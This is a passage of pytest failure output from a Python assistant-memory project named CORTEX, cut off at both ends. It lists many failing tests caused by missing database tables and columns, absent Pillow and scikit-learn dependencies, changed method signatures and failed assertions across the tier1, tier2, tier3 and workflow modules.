protection\n\u23f8\ufe0f      run tests      Execute test suite\n\U0001f3af      plan this      Interactive planning (CORTEX 2.1)\n--------------------------------------------------------------------------------\n\nLegend:\n  \u2705 ready    - Fully working\n  \U0001f504 partial  - Core working, some modules pending\n  \u23f8\ufe0f pending  - Architecture ready, implementation pending\n  \U0001f3af planned  - Design phase (CORTEX 2.1+)\n\nUsage:\n  Natural language:  "setup environment" or "refresh story" or "sync design"\n  Slash commands:    /setup or /CORTEX, refresh cortex story\n\n\ufffd **Next Steps:**\n  \u2022 Try: "help detailed" for more information\n  \u2022 Try: "help <command>" for specific command help\n  \u2022 Try: "setup environment" to get started\n\n\xa9 2024-2025 Asif Hussain \u2502 Proprietary \u2502 github.com/asifhussain60/CORTEX\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n')
_______________ TestExtractEntities.test_extract_file_entities ________________
tests\tier1\entities\test_entity_extractor.py:33: in test_extract_file_entities
    entities = extractor.extract_entities("conv-1", content)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\entities\entity_extractor.py:91: in extract_entities
    entity = self._add_or_update_entity(
src\tier1\entities\entity_extractor.py:153: in _add_or_update_entity
    cursor.execute("""
E   sqlite3.IntegrityError: NOT NULL constraint failed: entities.conversation_id
_______________ TestExtractEntities.test_extract_class_entities _______________
tests\tier1\entities\test_entity_extractor.py:42: in test_extract_class_entities
    entities = extractor.extract_entities("conv-1", content)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\entities\entity_extractor.py:102: in extract_entities
    entity = self._add_or_update_entity(
src\tier1\entities\entity_extractor.py:153: in _add_or_update_entity
    cursor.execute("""
E   sqlite3.IntegrityError: NOT NULL constraint failed: entities.conversation_id
______________ TestExtractEntities.test_extract_method_entities _______________
tests\tier1\entities\test_entity_extractor.py:51: in test_extract_method_entities
    entities = extractor.extract_entities("conv-1", content)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\entities\entity_extractor.py:113: in extract_entities
    entity = self._add_or_update_entity(
src\tier1\entities\entity_extractor.py:153: in _add_or_update_entity
    cursor.execute("""
E   sqlite3.IntegrityError: NOT NULL constraint failed: entities.conversation_id
___________ TestExtractEntities.test_extract_multiple_entity_types ____________
tests\tier1\entities\test_entity_extractor.py:63: in test_extract_multiple_entity_types
    entities = extractor.extract_entities("conv-1", content)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\entities\entity_extractor.py:91: in extract_entities
    entity = self._add_or_update_entity(
src\tier1\entities\entity_extractor.py:153: in _add_or_update_entity
    cursor.execute("""
E   sqlite3.IntegrityError: NOT NULL constraint failed: entities.conversation_id
_______ TestGetConversationEntities.test_get_entities_after_extraction ________
tests\tier1\entities\test_entity_extractor.py:86: in test_get_entities_after_extraction
    entities = extractor.get_conversation_entities("conv-1")
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\entities\entity_extractor.py:198: in get_conversation_entities
    cursor.execute("""
E   sqlite3.OperationalError: no such table: conversation_entities
______ TestGetConversationEntities.test_get_entities_empty_conversation _______
tests\tier1\entities\test_entity_extractor.py:91: in test_get_entities_empty_conversation
    entities = extractor.get_conversation_entities("nonexistent")
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\entities\entity_extractor.py:198: in get_conversation_entities
    cursor.execute("""
E   sqlite3.OperationalError: no such table: conversation_entities
______ TestGetEntityStatistics.test_get_statistics_includes_access_count ______
tests\tier1\entities\test_entity_extractor.py:105: in test_get_statistics_includes_access_count
    stats = extractor.get_entity_statistics()
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\entities\entity_extractor.py:227: in get_entity_statistics
    cursor.execute("""
E   sqlite3.OperationalError: no such table: conversation_entities
_________ TestGetEntityStatistics.test_get_statistics_empty_database __________
tests\tier1\entities\test_entity_extractor.py:113: in test_get_statistics_empty_database
    stats = extractor.get_entity_statistics()
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\entities\entity_extractor.py:227: in get_entity_statistics
    cursor.execute("""
E   sqlite3.OperationalError: no such table: conversation_entities
______________ TestEnforceFifoLimit.test_no_eviction_under_limit ______________
tests\tier1\fifo\test_queue_manager.py:46: in test_no_eviction_under_limit
    assert status["total_conversations"] == 19
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   KeyError: 'total_conversations'
__________ TestEnforceFifoLimit.test_evicts_oldest_when_at_capacity ___________
tests\tier1\fifo\test_queue_manager.py:60: in test_evicts_oldest_when_at_capacity
    assert oldest is None
E   AssertionError: assert Conversation(conversation_id='conv-0', title='Conv 0', created_at=datetime.datetime(2025, 11, 11, 12, 43, 38, 307525), updated_at=datetime.datetime(2025, 11, 11, 12, 43, 38, 307525), message_count=0, is_active=True, summary=None, tags=None) is None
_________ TestEnforceFifoLimit.test_never_evicts_active_conversation __________
tests\tier1\fifo\test_queue_manager.py:75: in test_never_evicts_active_conversation
    queue_manager.enforce_fifo_limit()
src\tier1\fifo\queue_manager.py:104: in enforce_fifo_limit
    self._delete_conversation(oldest_id, cursor)
src\tier1\fifo\queue_manager.py:130: in _delete_conversation
    cursor.execute("DELETE FROM messages WHERE conversation_id = ?", (conversation_id,))
E   sqlite3.OperationalError: no such table: messages
________________ TestEnforceFifoLimit.test_eviction_logs_event ________________
tests\tier1\fifo\test_queue_manager.py:91: in test_eviction_logs_event
    assert len(log) >= 1
E   assert 0 >= 1
E    +  where 0 = len([])
_____________ TestGetQueueStatus.test_status_shows_correct_counts _____________
tests\tier1\fifo\test_queue_manager.py:105: in test_status_shows_correct_counts
    assert status["total_conversations"] == 5
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   KeyError: 'total_conversations'
________________ TestGetQueueStatus.test_status_empty_database ________________
tests\tier1\fifo\test_queue_manager.py:112: in test_status_empty_database
    assert status["total_conversations"] == 0
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   KeyError: 'total_conversations'
___________________ TestAddMessages.test_add_single_message ___________________
tests\tier1\messages\test_message_store.py:35: in test_add_single_message
    retrieved = store.get_messages("conv-1")
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\messages\message_store.py:84: in get_messages
    cursor.execute("""
E   sqlite3.OperationalError: no such column: timestamp
_________________ TestAddMessages.test_add_multiple_messages __________________
tests\tier1\messages\test_message_store.py:48: in test_add_multiple_messages
    retrieved = store.get_messages("conv-2")
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\messages\message_store.py:84: in get_messages
    cursor.execute("""
E   sqlite3.OperationalError: no such column: timestamp
________ TestAddMessages.test_add_messages_to_different_conversations _________
tests\tier1\messages\test_message_store.py:56: in test_add_messages_to_different_conversations
    messages_a = store.get_messages("conv-a")
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\messages\message_store.py:84: in get_messages
    cursor.execute("""
E   sqlite3.OperationalError: no such column: timestamp
______________ TestGetMessages.test_get_messages_preserves_order ______________
tests\tier1\messages\test_message_store.py:77: in test_get_messages_preserves_order
    retrieved = store.get_messages("conv-1")
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\messages\message_store.py:84: in get_messages
    cursor.execute("""
E   sqlite3.OperationalError: no such column: timestamp
____________ TestGetMessages.test_get_messages_empty_conversation _____________
tests\tier1\messages\test_message_store.py:84: in test_get_messages_empty_conversation
    messages = store.get_messages("nonexistent")
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\messages\message_store.py:84: in get_messages
    cursor.execute("""
E   sqlite3.OperationalError: no such column: timestamp
____________ TestGetMessages.test_get_messages_includes_all_fields ____________
tests\tier1\messages\test_message_store.py:96: in test_get_messages_includes_all_fields
    retrieved = store.get_messages("conv-1")
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\messages\message_store.py:84: in get_messages
    cursor.execute("""
E   sqlite3.OperationalError: no such column: timestamp
_____________ TestDeleteMessages.test_delete_removes_all_messages _____________
tests\tier1\messages\test_message_store.py:141: in test_delete_removes_all_messages
    messages = store.get_messages("conv-1")
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\messages\message_store.py:84: in get_messages
    cursor.execute("""
E   sqlite3.OperationalError: no such column: timestamp
__________ TestTokenEstimation.test_estimate_tokens_for_small_image ___________
tests\tier1\test_vision_api.py:93: in test_estimate_tokens_for_small_image
    assert estimated > 0
E   assert 0 > 0
------------------------------ Captured log call ------------------------------
WARNING  src.tier1.vision_api:vision_api.py:82 PIL/Pillow not available. Image preprocessing disabled. Install with: pip install Pillow
____________ TestTokenEstimation.test_estimate_tokens_without_pil _____________
tests\tier1\test_vision_api.py:104: in test_estimate_tokens_without_pil
    assert estimated > 0
E   assert 0 > 0
------------------------------ Captured log call ------------------------------
WARNING  src.tier1.vision_api:vision_api.py:82 PIL/Pillow not available. Image preprocessing disabled. Install with: pip install Pillow
__________ TestBudgetEnforcement.test_reject_image_exceeding_budget ___________
tests\tier1\test_vision_api.py:127: in test_reject_image_exceeding_budget
    assert result['success'] is False
E   assert True is False
------------------------------ Captured log call ------------------------------
WARNING  src.tier1.vision_api:vision_api.py:82 PIL/Pillow not available. Image preprocessing disabled. Install with: pip install Pillow
INFO     src.tier1.vision_api:vision_api.py:330 Vision API call (MOCK): prompt='Analyze this...'
_____________________ TestMetrics.test_metrics_collection _____________________
tests\tier1\test_vision_api.py:245: in test_metrics_collection
    assert metrics['cache_hits'] >= 1
E   assert 0 >= 1
------------------------------ Captured log call ------------------------------
WARNING  src.tier1.vision_api:vision_api.py:82 PIL/Pillow not available. Image preprocessing disabled. Install with: pip install Pillow
INFO     src.tier1.vision_api:vision_api.py:330 Vision API call (MOCK): prompt='Test 1...'
INFO     src.tier1.vision_api:vision_api.py:330 Vision API call (MOCK): prompt='Test 2...'
___ TestVisionAPIAutoEngagement.test_vision_api_auto_engagement_end_to_end ____
tests\tier1\test_vision_api_auto_engagement.py:165: in test_vision_api_auto_engagement_end_to_end
    assert "purple" in result_str or "#7c3aed" in result_str, \
E   AssertionError: Analysis missing color detection
E   assert ('purple' in '{\'elements\': [{\'type\': \'button\', \'label\': \'action\', \'suggested_id\': \'btn-action\', \'selector\': \'button\', \'position\': {\'x\': 100, \'y\': 100}}], \'element_count\': 1, \'recommendations\': [\'ensure buttons have clear action labels\', "use playwright\'s getbyrole() for robust selectors", \'consider getbylabel() for form inputs\'], \'analysis_type\': \'basic\'}' or '#7c3aed' in '{\'elements\': [{\'type\': \'button\', \'label\': \'action\', \'suggested_id\': \'btn-action\', \'selector\': \'button\', \'position\': {\'x\': 100, \'y\': 100}}], \'element_count\': 1, \'recommendations\': [\'ensure buttons have clear action labels\', "use playwright\'s getbyrole() for robust selectors", \'consider getbylabel() for form inputs\'], \'analysis_type\': \'basic\'}')
---------------------------- Captured stdout call -----------------------------
[Analyzer] INFO: Vision API enabled for screenshot analysis
[Router] INFO: Image detected in request context - routing to screenshot analysis
[Analyzer] WARNING: Vision API error: 'success'
------------------------------ Captured log call ------------------------------
WARNING  src.tier1.vision_api:vision_api.py:82 PIL/Pillow not available. Image preprocessing disabled. Install with: pip install Pillow
INFO     cortex.agents.Analyzer:screenshot_analyzer.py:100 Vision API enabled for screenshot analysis
INFO     cortex.agents.Router:intent_router.py:178 Image detected in request context - routing to screenshot analysis
ERROR    src.tier1.vision_api:vision_api.py:181 Vision API error: 'success'
Traceback (most recent call last):
  File "D:\PROJECTS\CORTEX\src\tier1\vision_api.py", line 161, in analyze_image
    if not result['success']:
           ~~~~~~^^^^^^^^^^^
KeyError: 'success'
WARNING  cortex.agents.Analyzer:screenshot_analyzer.py:275 Vision API error: 'success'
_ TestContextOptimization.test_get_optimized_context_with_active_conversation _
tests\tier1\test_working_memory_optimization.py:139: in test_get_optimized_context_with_active_conversation
    result = working_memory_with_data.get_optimized_context()
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_ TestContextOptimization.test_get_optimized_context_with_specific_conversation _
tests\tier1\test_working_memory_optimization.py:157: in test_get_optimized_context_with_specific_conversation
    result = working_memory_with_data.get_optimized_context(conversation_id="conv2")
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
___ TestContextOptimization.test_get_optimized_context_with_pattern_context ___
tests\tier1\test_working_memory_optimization.py:180: in test_get_optimized_context_with_pattern_context
    result = working_memory_with_data.get_optimized_context(pattern_context=patterns)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_ TestContextOptimization.test_get_optimized_context_with_custom_target_reduction _
tests\tier1\test_working_memory_optimization.py:192: in test_get_optimized_context_with_custom_target_reduction
    result = working_memory_with_data.get_optimized_context(target_reduction=0.8)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
______ TestContextOptimization.test_build_context_with_no_conversations _______
tests\tier1\test_working_memory_optimization.py:215: in test_build_context_with_no_conversations
    result = working_memory.get_optimized_context()
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
___ TestCacheHealthIntegration.test_cache_health_check_on_context_retrieval ___
tests\tier1\test_working_memory_optimization.py:226: in test_cache_health_check_on_context_retrieval
    result = working_memory_with_data.get_optimized_context()
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
______ TestTokenMetricsIntegration.test_metrics_recorded_on_optimization ______
tests\tier1\test_working_memory_optimization.py:250: in test_metrics_recorded_on_optimization
    result = working_memory_with_data.get_optimized_context()
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_________ TestTokenMetricsIntegration.test_get_token_metrics_summary __________
tests\tier1\test_working_memory_optimization.py:264: in test_get_token_metrics_summary
    working_memory_with_data.get_optimized_context()
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
________ TestPerformanceTargets.test_optimization_overhead_under_50ms _________
tests\tier1\test_working_memory_optimization.py:288: in test_optimization_overhead_under_50ms
    working_memory_with_data.get_optimized_context()
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
__ TestPerformanceTargets.test_optimization_overhead_multiple_conversations ___
tests\tier1\test_working_memory_optimization.py:315: in test_optimization_overhead_multiple_conversations
    result = working_memory_with_data.get_optimized_context()
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
____________ TestQualityTargets.test_quality_score_above_threshold ____________
tests\tier1\test_working_memory_optimization.py:329: in test_quality_score_above_threshold
    result = working_memory_with_data.get_optimized_context()
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
_______ TestQualityTargets.test_quality_maintained_with_high_reduction ________
tests\tier1\test_working_memory_optimization.py:345: in test_quality_maintained_with_high_reduction
    result = working_memory_with_data.get_optimized_context(target_reduction=0.7)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
________ TestTokenEstimation.test_estimate_tokens_with_complex_context ________
tests\tier1\test_working_memory_optimization.py:372: in test_estimate_tokens_with_complex_context
    result = working_memory_with_data.get_optimized_context()
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
___________ TestEdgeCases.test_optimization_with_empty_conversation ___________
tests\tier1\test_working_memory_optimization.py:394: in test_optimization_with_empty_conversation
    result = working_memory.get_optimized_context(conversation_id="empty_conv")
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
__________ TestEdgeCases.test_optimization_with_none_conversation_id __________
tests\tier1\test_working_memory_optimization.py:402: in test_optimization_with_none_conversation_id
    result = working_memory.get_optimized_context(conversation_id=None)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
________ TestEdgeCases.test_optimization_with_invalid_target_reduction ________
tests\tier1\test_working_memory_optimization.py:411: in test_optimization_with_invalid_target_reduction
    result = working_memory_with_data.get_optimized_context(target_reduction=-0.5)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
src\tier1\working_memory.py:233: in get_optimized_context
    self.ml_optimizer = MLContextOptimizer(
src\tier1\ml_context_optimizer.py:49: in __init__
    raise ImportError(
E   ImportError: scikit-learn is required for ML Context Optimizer. Install with: pip install scikit-learn
________ TestDatabasePerformance.test_connection_establishment_is_fast ________
tests\tier2\knowledge_graph\test_database.py:363: in test_connection_establishment_is_fast
    assert elapsed_ms < 10, f"Connection should be <10ms, got {elapsed_ms:.2f}ms"
E   AssertionError: Connection should be <10ms, got 121.44ms
E   assert 121.4442253112793 < 10
________________ TestSmartFileFilter.test_filter_node_modules _________________
tests\tier2\test_smart_filter.py:66: in test_filter_node_modules
    assert self.filter.is_noise_file(file_path)
E   AssertionError: assert False
E    +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmp9px_pe5l/node_modules/package/index.js'))
E    +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24F1EDD10>.is_noise_file
E    +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24F1EDD10> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E5CDE00>.filter
_________________ TestSmartFileFilter.test_filter_dist_build __________________
tests\tier2\test_smart_filter.py:78: in test_filter_dist_build
    assert self.filter.is_noise_file(dist_file)
E   AssertionError: assert False
E    +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmp0_162urc/dist/bundle.js'))
E    +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EABA9E0>.is_noise_file
E    +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EABA9E0> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E5CDF30>.filter
_____________ TestSmartFileFilter.test_filter_generated_directory _____________
tests\tier2\test_smart_filter.py:145: in test_filter_generated_directory
    assert self.filter.is_noise_file(gen_file)
E   AssertionError: assert False
E    +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmpmru70fpa/generated/output.py'))
E    +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24F2A9C50>.is_noise_file
E    +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24F2A9C50> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E5A4F50>.filter
________________ TestSmartFileFilter.test_filter_git_directory ________________
tests\tier2\test_smart_filter.py:157: in test_filter_git_directory
    assert self.filter.is_noise_file(git_file)
E   AssertionError: assert False
E    +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmpb2da2n6p/.git/objects/abc123'))
E    +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24ED31F40>.is_noise_file
E    +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24ED31F40> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E5A58B0>.filter
________________ TestSmartFileFilter.test_filter_vscode_files _________________
tests\tier2\test_smart_filter.py:169: in test_filter_vscode_files
    assert self.filter.is_noise_file(vscode_file)
E   AssertionError: assert False
E    +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmp_1b9a_2r/.vscode/settings.json'))
E    +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EBC0500>.is_noise_file
E    +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EBC0500> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E60DFD0>.filter
_________________ TestSmartFileFilter.test_filter_idea_files __________________
tests\tier2\test_smart_filter.py:177: in test_filter_idea_files
    assert self.filter.is_noise_file(idea_file)
E   AssertionError: assert False
E    +  where False = is_noise_file(WindowsPath('C:/WINDOWS/TEMP/tmp99uwry8x/.idea/workspace.xml'))
E    +    where is_noise_file = <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EB7D470>.is_noise_file
E    +      where <scripts.cortex.auto_capture_daemon.SmartFileFilter object at 0x000001E24EB7D470> = <tests.tier2.test_smart_filter.TestSmartFileFilter object at 0x000001E24E518050>.filter
______________________ TestInsight.test_insight_creation ______________________
tests\tier3\analysis\test_insight_generator.py:69: in test_insight_creation
    insight = Insight(
E   TypeError: Insight.__init__() got an unexpected keyword argument 'data'
______________ TestVelocityAnalyzer.test_analyzer_initialization ______________
tests\tier3\analysis\test_velocity_analyzer.py:90: in test_analyzer_initialization
    assert velocity_analyzer.store == context_store
           ^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'VelocityAnalyzer' object has no attribute 'store'
___________ TestVelocityAnalyzer.test_calculate_velocity_with_data ____________
tests\tier3\analysis\test_velocity_analyzer.py:94: in test_calculate_velocity_with_data
    velocity = velocity_analyzer.calculate_velocity(days=30)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: VelocityAnalyzer.calculate_velocity() got an unexpected keyword argument 'days'
___________ TestVelocityAnalyzer.test_calculate_velocity_empty_data ___________
tests\tier3\analysis\test_velocity_analyzer.py:110: in test_calculate_velocity_empty_data
    velocity = velocity_analyzer.calculate_velocity(days=30)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: VelocityAnalyzer.calculate_velocity() got an unexpected keyword argument 'days'
_____________ TestVelocityAnalyzer.test_analyze_trends_with_data ______________
tests\tier3\analysis\test_velocity_analyzer.py:118: in test_analyze_trends_with_data
    trends = velocity_analyzer.analyze_trends(days=30)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'VelocityAnalyzer' object has no attribute 'analyze_trends'
___________ TestVelocityAnalyzer.test_velocity_calculation_accuracy ___________
tests\tier3\analysis\test_velocity_analyzer.py:132: in test_velocity_calculation_accuracy
    conn = sqlite3.connect(velocity_analyzer.store.db_path)
                           ^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'VelocityAnalyzer' object has no attribute 'store'
____________ TestVelocityAnalyzer.test_trend_direction_increasing _____________
tests\tier3\analysis\test_velocity_analyzer.py:164: in test_trend_direction_increasing
    conn = sqlite3.connect(velocity_analyzer.store.db_path)
                           ^^^^^^^^^^^^^^^^^^^^^^^
E   AttributeError: 'VelocityAnalyzer' object has no attribute 'store'
_______________ TestVelocityAnalyzer.test_date_range_filtering ________________
tests\tier3\analysis\test_velocity_analyzer.py:193: in test_date_range_filtering
    velocity_7 = velocity_analyzer.calculate_velocity(days=7)
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: VelocityAnalyzer.calculate_velocity() got an unexpected keyword argument 'days'
______________ TestVelocityAnalyzer.test_velocity_with_zero_days ______________
tests\tier3\analysis\test_velocity_analyzer.py:204: in test_velocity_with_zero_days
    velocity = velocity_analyzer.calculate_velocity(days=0)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: VelocityAnalyzer.calculate_velocity() got an unexpected keyword argument 'days'
___________ TestGitMetricsCollector.test_empty_repository_handling ____________
tests\tier3\metrics\test_git_metrics.py:257: in test_empty_repository_handling
    collector = GitMetricsCollector(empty_repo, store)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   TypeError: GitMetricsCollector.__init__() takes 2 positional arguments but 3 were given
_ TestWorkflowOrchestrator.test_execute_workflow_with_required_stage_failure __
tests\workflows\test_workflow_engine.py:461: in test_execute_workflow_with_required_stage_failure
    assert state.stage_statuses["stage1"] == StageStatus.FAILED
E   AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
E    +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
_ TestWorkflowOrchestrator.test_execute_workflow_with_optional_stage_failure __
tests\workflows\test_workflow_engine.py:487: in test_execute_workflow_with_optional_stage_failure
    assert state.stage_statuses["stage1"] == StageStatus.FAILED
E   AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
E    +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
_____________ TestWorkflowOrchestrator.test_checkpoint_and_resume _____________
tests\workflows\test_workflow_engine.py:524: in test_checkpoint_and_resume
    assert state.stage_statuses["stage2"] == StageStatus.FAILED
E   AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
E    +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
_____ TestFeatureDevelopmentWorkflow.test_feature_development_happy_path ______
tests\workflows\test_workflow_integration.py:131: in test_feature_development_happy_path
    assert all(
E   assert False
E    +  where False = all(<generator object TestFeatureDevelopmentWorkflow.test_feature_development_happy_path.<locals>.<genexpr> at 0x000001E24EBCF920>)
__ TestFeatureDevelopmentWorkflow.test_feature_development_checkpoint_resume __
